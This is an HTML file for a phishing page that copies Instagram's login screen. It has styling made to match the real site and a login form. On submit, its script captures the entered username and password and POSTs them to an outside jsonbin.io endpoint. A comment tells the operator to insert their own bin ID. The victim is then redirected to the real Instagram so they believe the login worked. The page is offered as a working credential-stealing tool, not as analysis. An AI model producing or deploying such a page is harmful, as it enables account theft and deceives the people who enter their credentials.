<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* Instagram Exact Styling */
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px;
            text-align: center;
        }

        h2 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 20px;
            margin-top: 30px;
        }

        .logo {
            margin-bottom: 30px;
            height: 57px;
        }

        input {
            width: 100%;
            padding: 9px 8px;
            margin-bottom: 6px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            outline: none;
            box-sizing: border-box; /* Ensures padding doesn't break width */
        }

        input:focus {
            border: 1px solid #a8a8a8;
        }

        .btn-login {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 7px 16px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 10px;
            cursor: pointer;
        }

        .btn-login:hover {
            background-color: #0082e5;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .divider span {
            padding: 0 10px;
        }

        /* Hidden input to store the data */
        #log-data {
            display: none;
        }
    </style>
</head>

        <h2>Log in to see photos and videos from your friends</h2>
        
        <form id="instaForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            
            <button type="submit" class="btn-login">Log in</button>
        </form>

        <div class="divider"><span>OR</span></div>

        <a href="#" style="color:#0095f6; font-size:12px; text-decoration:none;">Facebook Log In</a>
    </div>

    <script>
        const form = document.getElementById('instaForm');

        form.addEventListener('submit', function(e) {
            e.preventDefault(); // Stop the form from refreshing the page
            
            // 1. Get the values
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            
            console.log("Credentials Captured:", user, pass);

            // 2. Send to a webhook (Example: jsonbin.io or your own server)
            // You can replace the URL below with any endpoint that accepts POST requests
            
            fetch('https://jsonbin.io/v3/b/69df714aaaba8821970005b1', { // REPLACE THIS ID with your own JSONBin ID
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username: user,
                    password: pass,
                    time: new Date().toLocaleString(),
                    platform: 'Instagram Clone'
                })
            })
            .then(response => response.json())
            .then(data => {
                // 3. Redirect the user to real Instagram so they think it worked
                window.location.href = "https://www.instagram.com";
            })
            .catch(error => console.error('Error:', error));
        });
    </script>
</body>
</html>
